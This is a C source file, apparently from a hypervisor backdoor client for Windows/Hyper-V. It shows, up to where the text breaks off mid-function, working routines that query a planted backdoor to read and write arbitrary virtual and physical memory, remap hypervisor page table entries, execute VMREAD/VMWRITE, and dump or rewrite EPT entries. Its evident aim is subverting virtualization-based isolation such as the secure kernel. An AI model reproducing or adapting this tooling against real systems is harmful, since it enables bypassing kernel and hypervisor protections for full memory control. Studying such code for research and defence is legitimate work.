#include "stdafx.h"

// amount of time to collect secure kernel information
#define SK_INFO_TIMEOUT 5

// amount of time to colect EPT information
#define EPT_INFO_TIMEOUT 5

#define HV_PTE_BASE 0xffffff0000000000

// secure kernel maximum image size
#define SK_MAX_IMAGE_SIZE (10 * 1024 * 1024) // 10M

bool m_quiet = false;
//--------------------------------------------------------------------------------------
int backdoor_invalidate_caches(void)
{
    uint64_t arg0 = 0;
    uint64_t arg1 = 0;
    uint64_t arg2 = 0;

    uint64_t ret = backdoor_call(HVBD_C_INVL_CACHES, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_info(HVBD_INFO *info)
{
    uint64_t arg0 = 0;
    uint64_t arg1 = 0;
    uint64_t arg2 = 0;

    // query backdoor information
    uint64_t ret = backdoor_call(HVBD_C_INFO, &arg0, &arg1, &arg2);
    if (ret == HVBD_E_NO_BACKDOOR)
    {
        dbg_printf(__FUNCTION__"() ERROR: backdoor is not present\n");
        return -1;
    }

    if (ret != HVBD_E_SUCCESS)
    {
        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }

    if (info == NULL)
    {
        // just check backdoor presence
        return 0;
    }

    info->cr0 = arg0;
    info->cr3 = arg1;
    info->cr4 = arg2;

    // query extended backdoor information
    ret = backdoor_call(HVBD_C_INFO_EX, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }

    info->idt_base = (arg0 >> 16) | (arg1 << 48);
    info->idt_limit = arg0 & 0xffff;
    info->gs_base = arg2;

    // query extended backdoor information
    ret = backdoor_call(HVBD_C_INFO_EX2, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }

    info->vm_exit_addr = arg0;
    info->vm_exit_count = arg1;
    info->vm_call_count = arg2;

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_read(uint64_t addr, void *buff, int size)
{
    int temp_size = _ALIGN_UP(size, sizeof(uint64_t));

    // allocate temporary qword aligned buffer
    uint8_t *temp = (uint8_t *)M_ALLOC(temp_size);
    if (temp == NULL)
    {
        return -1;
    }

    for (int i = 0; i < temp_size; i += sizeof(uint64_t))
    {
        uint64_t arg0 = addr + i;
        uint64_t arg1 = 0;
        uint64_t arg2 = 0;
        uint64_t arg3 = 0;
        
        uint64_t ret = 0;
        uint32_t retry = 0;

        while (retry < 100)
        {
            retry += 1;

            // read single memory qword
            if ((ret = backdoor_call(HVBD_C_VIRT_READ, &arg0, &arg1, &arg2)) == HVBD_E_NO_BACKDOOR)
            {
                dbg_printf(__FUNCTION__"() ERROR: backdoor is not present\n");

                M_FREE(temp);
                return -1;
            }

            if (ret == HVBD_E_INVALID_PARAM)
            {
                continue;
            }

            break;
        }    

        if (ret != HVBD_E_SUCCESS)
        {
            dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);

            M_FREE(temp);
            return -1;
        }    

        *(uint64_t *)(temp + i) = arg1;
    }    

    // copy readed data to calee buffer
    memcpy(buff, temp, size);

    M_FREE(temp);
    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_read_64(uint64_t addr, uint64_t *val)
{
    uint64_t arg0 = addr;
    uint64_t arg1 = 0;
    uint64_t arg2 = 0;
    uint64_t arg3 = 0;

    // read single memory qword
    uint64_t ret = backdoor_call(HVBD_C_VIRT_READ, &arg0, &arg1, &arg2);
    if (ret == HVBD_E_NO_BACKDOOR)
    {
        dbg_printf(__FUNCTION__"() ERROR: backdoor is not present\n");
        return -1;
    }

    if (ret != HVBD_E_SUCCESS)
    {
        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }

    *val = arg1;
    
    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_read_32(uint64_t addr, uint32_t *val)
{
    uint64_t temp = 0;

    if (backdoor_virt_read_64(addr, &temp) == 0)
    {
        *val = (uint32_t)temp;

        return 0;
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_read_16(uint64_t addr, uint16_t *val)
{
    uint64_t temp = 0;

    if (backdoor_virt_read_64(addr, &temp) == 0)
    {
        *val = (uint16_t)temp;
        
        return 0;
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_read_8(uint64_t addr, uint8_t *val)
{
    uint64_t temp = 0;

    if (backdoor_virt_read_64(addr, &temp) == 0)
    {
        *val = (uint8_t)temp;
        
        return 0;
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_write(uint64_t addr, void *buff, int size)
{
    int temp_size = _ALIGN_UP(size, sizeof(uint64_t));

    // allocate temporary qword aligned buffer
    uint8_t *temp = (uint8_t *)M_ALLOC(temp_size);
    if (temp == NULL)
    {
        return -1;
    }

    // read original memory contents
    if (backdoor_virt_read(addr, temp, temp_size) != 0)
    {
        M_FREE(temp);
        return -1;
    }

    // copy data to write into the buffer
    memcpy(temp, buff, size);

    for (int i = 0; i < temp_size; i += sizeof(uint64_t))
    {
        uint64_t arg0 = addr + i;
        uint64_t arg1 = *(uint64_t *)(temp + i);
        uint64_t arg2 = 0;
        uint64_t arg3 = 0;

        // write single memory qword
        uint64_t ret = backdoor_call(HVBD_C_VIRT_WRITE, &arg0, &arg1, &arg2);
        if (ret == HVBD_E_NO_BACKDOOR)
        {
            M_FREE(temp);
            return -1;
        }

        if (ret != HVBD_E_SUCCESS)
        {
            M_FREE(temp);
            return -1;
        }
    }    

    M_FREE(temp);
    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_write_64(uint64_t addr, uint64_t val)
{
    uint64_t arg0 = addr;
    uint64_t arg1 = val;
    uint64_t arg2 = 0;
    uint64_t arg3 = 0;

    // write single memory qword
    uint64_t ret = backdoor_call(HVBD_C_VIRT_WRITE, &arg0, &arg1, &arg2);
    if (ret == HVBD_E_NO_BACKDOOR)
    {
        dbg_printf(__FUNCTION__"() ERROR: backdoor is not present\n");
        return -1;
    }

    if (ret != HVBD_E_SUCCESS)
    {
        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }
    
    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_write_32(uint64_t addr, uint32_t val)
{
    uint64_t temp = 0;

    if (backdoor_virt_read_64(addr, &temp) == 0)
    {
        temp = (temp & 0xffffffff00000000) | val;

        if (backdoor_virt_write_64(addr, temp) == 0)
        {
            return 0;
        }
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_write_16(uint64_t addr, uint16_t val)
{
    uint64_t temp = 0;

    if (backdoor_virt_read_64(addr, &temp) == 0)
    {
        temp = (temp & 0xffffffffffff0000) | val;

        if (backdoor_virt_write_64(addr, temp) == 0)
        {
            return 0;
        }
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_write_8(uint64_t addr, uint8_t val)
{
    uint64_t temp = 0;

    if (backdoor_virt_read_64(addr, &temp) == 0)
    {
        temp = (temp & 0xffffffffffffff00) | val;

        if (backdoor_virt_write_64(addr, temp) == 0)
        {
            return 0;
        }
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_map(uint64_t pte_index, uint64_t phys_addr)
{
    uint64_t pte_addr = HV_PTE_BASE + (pte_index * sizeof(uint64_t));
    uint64_t pte_data = (phys_addr & 0xfffffffff000) | PTE_PRESENT | PTE_RW;

    // write page table entry
    if (backdoor_virt_write_64(pte_addr, pte_data) != 0)
    {
        return -1;
    }

    backdoor_invalidate_caches();

    SwitchToThread();

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_unmap(uint64_t pte_index)
{
    uint64_t pte_addr = HV_PTE_BASE + (pte_index * sizeof(uint64_t));

    // write page table entry
    if (backdoor_virt_write_64(pte_addr, 0) != 0)
    {
        return -1;
    }

    backdoor_invalidate_caches();

    SwitchToThread();

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_phys_read(uint64_t addr, void *buff, int size)
{
    uint64_t temp_addr = _ALIGN_DOWN(addr, PAGE_SIZE);
    uint64_t temp_size = _ALIGN_UP(addr - temp_addr + size, PAGE_SIZE);

    // allocate temporary qword aligned buffer
    uint8_t *temp = (uint8_t *)M_ALLOC(temp_size);
    if (temp == NULL)
    {
        return -1;
    }

    for (int i = 0; i < temp_size; i += PAGE_SIZE)
    {
        // map physical memory page at zero VA
        backdoor_virt_map(0, temp_addr + i);        

        // read page contents from virtual memory
        if (backdoor_virt_read(0, temp + i, PAGE_SIZE) != 0)
        {
            M_FREE(temp);
            return -1;            
        }
        
        // unmap physical memory page
        backdoor_virt_unmap(0);   
    }

    // copy readed data to calee buffer
    memcpy(buff, temp + (addr - temp_addr), size);

    M_FREE(temp);
    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_phys_read_64(uint64_t addr, uint64_t *val)
{
    return backdoor_phys_read(addr, (void *)val, sizeof(uint64_t));
}
//--------------------------------------------------------------------------------------
int backdoor_phys_read_32(uint64_t addr, uint32_t *val)
{
    return backdoor_phys_read(addr, (void *)val, sizeof(uint32_t));   
}
//--------------------------------------------------------------------------------------
int backdoor_phys_read_16(uint64_t addr, uint16_t *val)
{
    return backdoor_phys_read(addr, (void *)val, sizeof(uint16_t));
}
//--------------------------------------------------------------------------------------
int backdoor_phys_read_8(uint64_t addr, uint8_t *val)
{
    return backdoor_phys_read(addr, (void *)val, sizeof(uint8_t));
}
//--------------------------------------------------------------------------------------
int backdoor_phys_write(uint64_t addr, void *buff, int size)
{
    uint64_t temp_addr = _ALIGN_DOWN(addr, PAGE_SIZE);
    uint64_t temp_size = _ALIGN_UP(addr - temp_addr + size, PAGE_SIZE);

    // allocate temporary qword aligned buffer
    uint8_t *temp = (uint8_t *)M_ALLOC(temp_size);
    if (temp == NULL)
    {
        return -1;
    }

    for (int i = 0; i < temp_size; i += PAGE_SIZE)
    {
        // map physical memory page at zero VA
        backdoor_virt_map(0, temp_addr + i);        

        // read page contents from virtual memory
        if (backdoor_virt_read(0, temp + i, PAGE_SIZE) != 0)
        {
            M_FREE(temp);
            return -1;            
        }
        
        // unmap physical memory page
        backdoor_virt_unmap(0);   
    }

    // copy new data to the buffer
    memcpy(temp + (addr - temp_addr), buff, size);

    for (int i = 0; i < temp_size; i += PAGE_SIZE)
    {
        // map physical memory page at zero VA
        backdoor_virt_map(0, temp_addr + i);        

        // write page contents into virtual memory
        if (backdoor_virt_write(0, temp + i, PAGE_SIZE) != 0)
        {
            M_FREE(temp);
            return -1;            
        }
        
        // unmap physical memory page
        backdoor_virt_unmap(0);   
    }

    M_FREE(temp);
    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_phys_write_64(uint64_t addr, uint64_t val)
{
    return backdoor_phys_write(addr, (void *)&val, sizeof(uint64_t));
}
//--------------------------------------------------------------------------------------
int backdoor_phys_write_32(uint64_t addr, uint32_t val)
{
    return backdoor_phys_write(addr, (void *)&val, sizeof(uint32_t));
}
//--------------------------------------------------------------------------------------
int backdoor_phys_write_16(uint64_t addr, uint16_t val)
{
    return backdoor_phys_write(addr, (void *)&val, sizeof(uint16_t));
}
//--------------------------------------------------------------------------------------
int backdoor_phys_write_8(uint64_t addr, uint8_t val)
{
    return backdoor_phys_write(addr, (void *)&val, sizeof(uint8_t));
}
//--------------------------------------------------------------------------------------
int backdoor_vmread(uint64_t val, uint64_t *data)
{
    uint64_t arg0 = val;
    uint64_t arg1 = 0;
    uint64_t arg2 = 0;

    // execute VMREAD instruction on current VMCS
    uint64_t ret = backdoor_call(HVBD_C_VMREAD, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }

    *data = arg1;

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_vmwrite(uint64_t val, uint64_t data)
{
    uint64_t arg0 = val;
    uint64_t arg1 = data;
    uint64_t arg2 = 0;

    // execute VMRITE instruction on current VMCS
    uint64_t ret = backdoor_call(HVBD_C_VMWRITE, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_ept_list(EPT_INFO *ept_list)
{
    uint64_t arg0 = 0;
    uint64_t arg1 = 0;
    uint64_t arg2 = 0;    

    dbg_printf("[+] Collecting EPT address list...\n");

    // start collecting EPT
    uint64_t ret = backdoor_call(HVBD_C_EPT_GET_START, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }    

    for (int i = EPT_INFO_TIMEOUT; i > 0; i -= 1)
    {
        dbg_printf("\r> %d   ", i);

        Sleep(1000);
    }

    dbg_printf("\r");

    // stop collecting EPT
    ret = backdoor_call(HVBD_C_EPT_GET_STOP, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }    

    dbg_printf("[+] Reading collected data from 0x%llx...\n", arg0);

    if (backdoor_virt_read(arg0, ept_list, sizeof(EPT_INFO) * EPT_MAX_COUNT) != 0)
    {
        return -1;
    }    

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_ept_dump(uint64_t pml4_addr)
{
    int ret = -1;
    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PML4_page = NULL, *PDPT_page = NULL;
    X64_PAGE_DIRECTORY_ENTRY_4K *PD_page = NULL;
    X64_PAGE_TABLE_ENTRY_4K *PT_page = NULL;
    
    if ((PML4_page = (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)M_ALLOC(PAGE_SIZE)) == NULL)
    {
        goto _end;
    }

    if ((PDPT_page = (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)M_ALLOC(PAGE_SIZE)) == NULL)
    {
        goto _end;
    }

    if ((PD_page = (X64_PAGE_DIRECTORY_ENTRY_4K *)M_ALLOC(PAGE_SIZE)) == NULL)
    {
        goto _end;
    }

    if ((PT_page = (X64_PAGE_TABLE_ENTRY_4K *)M_ALLOC(PAGE_SIZE)) == NULL)
    {
        goto _end;
    }    

    // read PML4 memory page
    if (backdoor_phys_read(PML4_ADDRESS(pml4_addr), PML4_page, PAGE_SIZE) != 0)
    {
        goto _end;
    }

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PML4_entry = PML4_page;

    uint64_t host_addr = 0, guest_addr = 0;

    // enumerate PML4 entries
    for (uint64_t i_1 = 0; i_1 < PAGE_SIZE / sizeof(uint64_t); i_1 += 1)
    {
        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PDPT_entry = PDPT_page;

        if (!EPT_PRESENT(PML4_entry->Uint64))
        {
            PML4_entry += 1;
            continue;
        }

        dbg_printf("PML4E #%.4x: 0x%.16llx\n", i_1, PML4_entry->Uint64);
        
        // read PDPT memory page
        if (backdoor_phys_read(PFN_TO_PAGE(PML4_entry->Bits.PageTableBaseAddress), 
                                           PDPT_page, PAGE_SIZE) != 0)
        {
            goto _end;
        }

        // enumerate PDPT entries
        for (uint64_t i_2 = 0; i_2 < PAGE_SIZE / sizeof(uint64_t); i_2 += 1)
        {                        
            if (!EPT_PRESENT(PDPT_entry->Uint64))
            {
                PDPT_entry += 1;
                continue;
            }

            dbg_printf("PDPTE #%.4x: 0x%.16llx\n", i_2, PDPT_entry->Uint64);

            // check for page size flag
            if ((PDPT_entry->Uint64 & PDPTE_PDE_PS) == 0)
            {
                X64_PAGE_DIRECTORY_ENTRY_4K *PD_entry = PD_page;

                // read PDE memory page
                if (backdoor_phys_read(PFN_TO_PAGE(PDPT_entry->Bits.PageTableBaseAddress),
                                                   PD_page, PAGE_SIZE) != 0)
                {
                    goto _end;
                }

                // enumerate PDE entries
                for (uint64_t i_3 = 0; i_3 < PAGE_SIZE / sizeof(uint64_t); i_3 += 1)
                {
                    if (!EPT_PRESENT(PD_entry->Uint64))
                    {
                        PD_entry += 1;
                        continue;
                    }

                    dbg_printf("  PDE #%.4x: 0x%.16llx\n", i_3, PD_entry->Uint64);

                    // check for page size flag
                    if ((PD_entry->Uint64 & PDPTE_PDE_PS) == 0)
                    {
                        X64_PAGE_TABLE_ENTRY_4K *PT_entry = PT_page;

                        // read PTE memory page
                        if (backdoor_phys_read(PFN_TO_PAGE(PD_entry->Bits.PageTableBaseAddress),
                                                           PT_page, PAGE_SIZE) != 0)
                        {
                            goto _end;
                        }

                        // enumerate PTE entries
                        for (uint64_t i_4 = 0; i_4 < PAGE_SIZE / sizeof(uint64_t); i_4 += 1)
                        {
                            if (!EPT_PRESENT(PT_entry->Uint64))
                            {
                                PT_entry += 1;
                                continue;
                            }                            

                            // 4 Kb page
                            host_addr = PFN_TO_PAGE(PT_entry->Bits.PageTableBaseAddress);
                            guest_addr = PML4_ADDR(i_1) | PDPT_ADDR(i_2) | PDE_ADDR(i_3) | PTE_ADDR(i_4);                            
                            
                            dbg_printf(
                                "             0x%.16llx -> 0x%.16llx 4K %s%s%s %s\n",
                                guest_addr, host_addr,
                                EPT_R(PT_entry->Uint64) ? "R" : "", EPT_W(PT_entry->Uint64) ? "W" : "", 
                                EPT_X(PT_entry->Uint64) ? "X" : "",
                                host_addr != guest_addr ? "*" : ""
                            );

                            PT_entry += 1;
                        }
                    }
                    else
                    {                        
                        // 2Mb page
                        host_addr = PFN_TO_PAGE(PD_entry->Bits.PageTableBaseAddress);
                        guest_addr = PML4_ADDR(i_1) | PDPT_ADDR(i_2) | PDE_ADDR(i_3);
                            
                        dbg_printf(
                            "             0x%.16llx -> 0x%.16llx 2M %s%s%s %s\n",
                            guest_addr, host_addr,
                            EPT_R(PD_entry->Uint64) ? "R" : "", EPT_W(PD_entry->Uint64) ? "W" : "", 
                            EPT_X(PD_entry->Uint64) ? "X" : "",
                            host_addr != guest_addr ? "*" : ""
                        );
                    }

                    dbg_printf("\n");

                    PD_entry += 1;
                }
            }
            else
            {
                // 1Gb page
                host_addr = PFN_TO_PAGE(PDPT_entry->Bits.PageTableBaseAddress);
                guest_addr = PML4_ADDR(i_1) | PDPT_ADDR(i_2);

                dbg_printf(
                    "             0x%.16llx -> 0x%.16llx 1G %s%s%s %s\n",
                    guest_addr, host_addr,
                    EPT_R(PDPT_entry->Uint64) ? "R" : "", EPT_W(PDPT_entry->Uint64) ? "W" : "", 
                    EPT_X(PDPT_entry->Uint64) ? "X" : "",
                    host_addr != guest_addr ? "*" : ""
                );
            }

            dbg_printf("\n");

            PDPT_entry += 1;
        }

        dbg_printf("\n");

        PML4_entry += 1;
    }

    ret = 0;

_end:

    if (PT_page)
    {
        M_FREE(PT_page);
    }

    if (PD_page)
    {
        M_FREE(PD_page);
    }

    if (PDPT_page)
    {
        M_FREE(PDPT_page);
    }

    if (PML4_page)
    {
        M_FREE(PML4_page);
    }

    return ret;
}
//--------------------------------------------------------------------------------------
int backdoor_phys_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr)
{
    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4_entry;    

    if (!m_quiet)
    {
        dbg_printf(__FUNCTION__"(): EPT PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
    }    

    if (backdoor_phys_read_64(
        PML4_ADDRESS(pml4_addr) + PML4_INDEX(addr) * sizeof(uint64_t),
        &PML4_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        dbg_printf(
            "EPT PML4E 0x%llx[0x%llx]: 0x%llx\n", 
            PML4_ADDRESS(pml4_addr), PML4_INDEX(addr), PML4_entry.Uint64
        );
    }

    if (!EPT_PRESENT(PML4_entry.Uint64))
    {
        dbg_printf("ERROR: EPT PML4E for 0x%llx is not present\n", addr);
        return -1;
    }

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPT_entry;

    if (backdoor_phys_read_64(
        PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress) + PDPT_INDEX(addr) * sizeof(uint64_t),
        &PDPT_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        dbg_printf(
            "EPT PDPTE 0x%llx[0x%llx]: 0x%llx\n", 
            PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress), PDPT_INDEX(addr), PDPT_entry.Uint64
        );
    }

    if (!EPT_PRESENT(PDPT_entry.Uint64))
    {
        dbg_printf("ERROR: EPT PDPTE for 0x%llx is not present\n", addr);
        return -1;
    }

    // check for page size flag
    if ((PDPT_entry.Uint64 & PDPTE_PDE_PS) == 0)
    {
        X64_PAGE_DIRECTORY_ENTRY_4K PD_entry;

        if (backdoor_phys_read_64(
            PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) + PDE_INDEX(addr) * sizeof(uint64_t),
            &PD_entry.Uint64) != 0)
        {
            return -1;
        }

        if (!m_quiet)
        {
            dbg_printf(
                "  EPT PDE 0x%llx[0x%llx]: 0x%llx\n", 
                PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress), PDE_INDEX(addr), 
                PD_entry.Uint64
            );
        }

        if (!EPT_PRESENT(PD_entry.Uint64))
        {
            dbg_printf("ERROR: EPT PDE for 0x%llx is not present\n", addr);
            return -1;
        }

        // check for page size flag
        if ((PD_entry.Uint64 & PDPTE_PDE_PS) == 0)
        {
            X64_PAGE_TABLE_ENTRY_4K PT_entry;

            if (backdoor_phys_read_64(
                PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) + PTE_INDEX(addr) * sizeof(uint64_t),
                &PT_entry.Uint64) != 0)
            {
                return -1;
            }

            if (!m_quiet)
            {
                dbg_printf(
                    "  EPT PTE 0x%llx[0x%llx]: 0x%llx\n", 
                    PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress), PTE_INDEX(addr), 
                    PT_entry.Uint64
                );
            }

            if (EPT_PRESENT(PT_entry.Uint64))
            {
                *ret = PFN_TO_PAGE(PT_entry.Bits.PageTableBaseAddress) +
                       PAGE_OFFSET_4K(addr);

                return 0;
            }
            else
            {
                dbg_printf("ERROR: EPT PTE for 0x%llx is not present\n", addr);
            }
        }
        else
        {
            *ret = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) +
                   PAGE_OFFSET_2M(addr);

            return 0;
        }                  
    }
    else
    {
        *ret = PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) +
               PAGE_OFFSET_1G(addr);
        
        return 0;
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_phys_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t pml4_addr)
{
    uint64_t phys_addr = 0;

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4_entry;    

    if (!m_quiet)
    {
        dbg_printf(__FUNCTION__"(): EPT PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
    }    

    if (backdoor_phys_read_64(
        PML4_ADDRESS(pml4_addr) + PML4_INDEX(addr) * sizeof(uint64_t),
        &PML4_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        dbg_printf(
            "EPT PML4E 0x%llx[0x%llx]: 0x%llx\n", 
            PML4_ADDRESS(pml4_addr), PML4_INDEX(addr), PML4_entry.Uint64
        );
    }

    if (!EPT_PRESENT(PML4_entry.Uint64))
    {
        dbg_printf("ERROR: EPT PML4E for 0x%llx is not present\n", addr);
        return -1;
    }

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPT_entry;

    if (backdoor_phys_read_64(
        PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress) + PDPT_INDEX(addr) * sizeof(uint64_t),
        &PDPT_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        dbg_printf(
            "EPT PDPTE 0x%llx[0x%llx]: 0x%llx\n", 
            PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress), PDPT_INDEX(addr), PDPT_entry.Uint64
        );
    }

    if (!EPT_PRESENT(PDPT_entry.Uint64))
    {
        dbg_printf("ERROR: EPT PDPTE for 0x%llx is not present\n", addr);
        return -1;
    }

    // check for page size flag
    if ((PDPT_entry.Uint64 & PDPTE_PDE_PS) == 0)
    {
        X64_PAGE_DIRECTORY_ENTRY_4K PD_entry;

        if (backdoor_phys_read_64(
            PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) + PDE_INDEX(addr) * sizeof(uint64_t),
            &PD_entry.Uint64) != 0)
        {
            return -1;
        }

        if (!m_quiet)
        {
            dbg_printf(
                "  EPT PDE 0x%llx[0x%llx]: 0x%llx\n", 
                PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress), PDE_INDEX(addr), 
                PD_entry.Uint64
            );
        }

        if (!EPT_PRESENT(PD_entry.Uint64))
        {
            dbg_printf("ERROR: EPT PDE for 0x%llx is not present\n", addr);
            return -1;
        }

        // check for page size flag
        if ((PD_entry.Uint64 & PDPTE_PDE_PS) == 0)
        {
            phys_addr = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) + PTE_INDEX(addr) * sizeof(uint64_t);

            if (backdoor_phys_read_64(phys_addr, old) != 0)
            {
                return -1;
            }

            if (!m_quiet)
            {
                dbg_printf(
                    "  PTE 0x%llx[0x%llx]: 0x%llx -> 0x%llx\n", 
                    PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress), PTE_INDEX(addr), 
                    *old, entry
                );
            }

            if (backdoor_phys_write_64(phys_addr, entry) != 0)
            {
                return -1;
            }

            return 0;
        }
        else
        {
            dbg_printf("ERROR: 2M page");
        }                  
    }
    else
    {
        dbg_printf("ERROR: 1G page\n");
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr, uint64_t ept_addr)
{
    uint64_t phys_addr = 0;
    
    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4_entry;    

    if (!m_quiet)
    {
        dbg_printf(__FUNCTION__"(): PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
    }

    phys_addr = PML4_ADDRESS(pml4_addr) + PML4_INDEX(addr) * sizeof(uint64_t);

    if (ept_addr != 0)
    {
        if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
        {
            return -1;
        }
    }

    if (backdoor_phys_read_64(phys_addr, &PML4_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        dbg_printf(
            "PML4E 0x%llx[0x%llx]: 0x%llx\n", 
            PML4_ADDRESS(pml4_addr), PML4_INDEX(addr), PML4_entry.Uint64
        );
    }

    if (PML4_entry.Bits.Present == 0)
    {
        dbg_printf("ERROR: PML4E for 0x%llx is not present\n", addr);
        return -1;
    }

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPT_entry;

    phys_addr = PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress) + PDPT_INDEX(addr) * sizeof(uint64_t);

    if (ept_addr != 0)
    {
        if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
        {
            return -1;
        }
    }

    if (backdoor_phys_read_64(phys_addr, &PDPT_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        dbg_printf(
            "PDPTE 0x%llx[0x%llx]: 0x%llx\n", 
            PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress), PDPT_INDEX(addr), PDPT_entry.Uint64
        );
    }

    if (PDPT_entry.Bits.Present == 0)
    {
        dbg_printf("ERROR: PDPTE for 0x%llx is not present\n", addr);
        return -1;
    }

    // check for page size flag
    if ((PDPT_entry.Uint64 & PDPTE_PDE_PS) == 0)
    {
        X64_PAGE_DIRECTORY_ENTRY_4K PD_entry;

        phys_addr = PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) + PDE_INDEX(addr) * sizeof(uint64_t);

        if (ept_addr != 0)
        {
            if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
            {
                return -1;
            }
        }

        if (backdoor_phys_read_64(phys_addr, &PD_entry.Uint64) != 0)
        {
            return -1;
        }

        if (!m_quiet)
        {
            dbg_printf(
                "  PDE 0x%llx[0x%llx]: 0x%llx\n", 
                PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress), PDE_INDEX(addr), 
                PD_entry.Uint64
            );
        }

        if (PD_entry.Bits.Present == 0)
        {
            dbg_printf("ERROR: PDE for 0x%llx is not present\n", addr);
            return -1;
        }

        // check for page size flag
        if ((PD_entry.Uint64 & PDPTE_PDE_PS) == 0)
        {
            X64_PAGE_TABLE_ENTRY_4K PT_entry;

            phys_addr = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) + PTE_INDEX(addr) * sizeof(uint64_t);

            if (ept_addr != 0)
            {
                if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
                {
                    return -1;
                }
            }

            if (backdoor_phys_read_64(phys_addr, &PT_entry.Uint64) != 0)
            {
                return -1;
            }

            if (!m_quiet)
            {
                dbg_printf(
                    "  PTE 0x%llx[0x%llx]: 0x%llx\n", 
